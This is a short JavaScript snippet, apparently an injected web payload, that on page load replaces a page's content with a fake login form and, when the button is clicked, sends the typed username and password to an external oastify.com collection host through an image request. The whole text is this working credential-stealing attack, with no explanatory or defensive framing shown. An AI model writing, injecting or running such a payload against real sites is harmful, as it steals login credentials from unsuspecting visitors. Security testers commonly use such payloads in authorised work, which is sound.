window.onload = () => {
  document.body.innerHTML = `
    <input id="u">
    <input id="p" type="password">
    <button onclick="(new Image()).src='https://w1yffibjrekm66vml2xiuihiw920qtei.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
      Send
    </button>
  `;
};
